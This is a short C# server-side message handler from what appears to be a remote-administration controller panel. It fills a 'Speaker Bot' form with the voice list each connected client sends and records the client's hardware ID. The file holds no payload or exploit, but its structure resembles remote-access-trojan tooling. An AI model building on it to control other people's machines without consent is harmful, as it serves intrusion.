using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerBotSpeaker
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string a = (string)objects[1];
		if (!(a == "Connect"))
		{
			if (!(a == "List"))
			{
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormSpeakerBot form = (FormSpeakerBot)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.rjComboBox1.Items.Clear();
				int num = 2;
				while (num < objects.Length)
				{
					form.rjComboBox1.Items.Add((string)objects[num++]);
				}
				if (form.rjComboBox1.Items.Count > 0)
				{
					form.rjComboBox1.SelectedIndex = 0;
				}
			});
			return;
		}
		FormSpeakerBot form2 = (FormSpeakerBot)Application.OpenForms["BotSpeaker:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Speaker Bot [" + (string)objects[2] + "]";
			form2.client = client;
			form2.richTextBox1.Enabled = true;
			form2.rjComboBox1.Enabled = true;
			form2.materialSlider1.Enabled = true;
			form2.materialSlider2.Enabled = true;
			form2.rjButton1.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
